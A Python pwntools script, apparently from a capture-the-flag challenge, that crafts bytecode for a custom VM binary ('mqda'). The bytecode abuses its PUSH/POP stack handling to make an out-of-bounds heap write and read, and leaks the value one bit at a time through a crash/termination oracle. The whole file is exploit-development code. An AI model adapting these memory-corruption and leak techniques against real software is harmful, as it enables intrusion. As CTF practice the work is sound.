#!/usr/bin/env python3
"""
Fixed OOB leak test - write at offset 0xFB so we read it at offset 0xFF
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def trigger_illegal():
    return bytes([0xFF])

def create_oob_test(bit_position, expected_bit):
    """
    Test OOB read by:
    1. Write 0xAAAABBBB at page 0, offset 0xFB
       (PUSH writes 4 bytes at [SP], so this goes to offsets 0xFF-0x102)
       Wait no, PUSH writes at page[offset+4], so SP=0xFB writes to page[0xFF]
       Actually PUSH at SP decrements SP by 4 first then writes...
       
    Let me trace through PUSH logic more carefully.
    """
    code = b''
    
    # From disassembly, PUSH at 0x2137:
    # mov dword [rdx + rax + 4], ecx  ; write reg value
    # sub dword [rbp + 0x4c], 4       ; decrement SP
    # So PUSH writes at [page + (SP & 0xFF) + 4] = page[offset + 4]
    # Then decrements SP.
    
    # To read from page[0x103], we need to read at offset 0xFF (0xFF + 4 = 0x103)
    # To write at page[0x103], we need to write at offset 0xFF (0xFF + 4 = 0x103)
    # This means SP=0xFF when we PUSH
    
    # BUT! PUSH also DECREMENTS SP after writing! So SP goes from 0xFF to 0xFB.
    
    # For POP, we read from [page + (SP & 0xFF) + 4], then INCREMENT SP.
    # So if we want to read from 0x103, SP should be 0xFF before POP.
    
    # So the sequence is:
    # 1. Set SP = 0xFF
    # 2. PUSH value (writes to page[0x103], SP becomes 0xFB)
    # 3. Set SP = 0xFF again
    # 4. POP (reads from page[0x103], SP becomes 0x03 due to wrapping)
    
    # Allocate page at 0x0000
    code += mov_reg_imm(15, 0x00)  # SP = 0
    code += mov_reg_imm(0, 0x11111111)
    code += push_reg(0)  # Write to page[4], SP = -4 = 0xFFFFFFFC
    
    # Now write at offset 0xFF
    code += mov_reg_imm(15, 0xFF)  # SP = 0xFF
    code += mov_reg_imm(0, 0xDEADBEEF)
    code += push_reg(0)  # Write 0xDEADBEEF to page[0x103] (OOB write!)
    
    # Allocate page at 0x0100 (this is the "next" chunk in heap)
    code += mov_reg_imm(15, 0x100)
    code += mov_reg_imm(0, 0x22222222)
    code += push_reg(0)  # Write to page[4]
    
    # Now read from page 0 at offset 0xFF (OOB read)
    code += mov_reg_imm(15, 0xFF)  # SP = 0xFF
    code += pop_reg(0)  # Read from page[0x103] into r0 (OOB read!)
    
    # r0 should now have 0xDEADBEEF if we wrote there
    # Test specific bit
    if bit_position > 0:
        shl_amount = 31 - bit_position
        if shl_amount > 0:
            code += shl_reg_imm(0, shl_amount)
    code += shr_reg_imm(0, 31)
    
    code += mov_reg_imm(1, expected_bit)
    code += cmp_reg_reg(0, 1)
    
    current = len(code)
    hlt_offset = current + 6 + 2 + 1
    code += mov_reg_imm(2, hlt_offset)
    code += jne_reg(2)
    code += trigger_illegal()
    code += hlt()
    
    return code

def test_oob_bit(bit_position, expected_bit=1):
    code = create_oob_test(bit_position, expected_bit)
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=2)
    p.close()
    
    return b'TERMINATED' in output

def leak_oob_dword():
    val = 0
    for bit in range(32):
        sys.stdout.write(f"\r[*] Bit {bit}/32...")
        sys.stdout.flush()
        if test_oob_bit(bit, 1):
            val |= (1 << bit)
    print()
    return val

def main():
    print("[*] OOB Read/Write Test")
    print("[*] ====================")
    print("[*] 1. Write 0xDEADBEEF to page[0x103] via OOB PUSH")
    print("[*] 2. Read it back via OOB POP")
    print("[*] Expected value: 0xDEADBEEF")
    
    val = leak_oob_dword()
    print(f"\n[+] Read value: 0x{val:08x}")
    
    if val == 0xDEADBEEF:
        print("[+] SUCCESS! OOB read/write verified!")
    else:
        print("[-] Unexpected value")
        print(f"[*] Expected: 0xDEADBEEF")

if __name__ == '__main__':
    main()
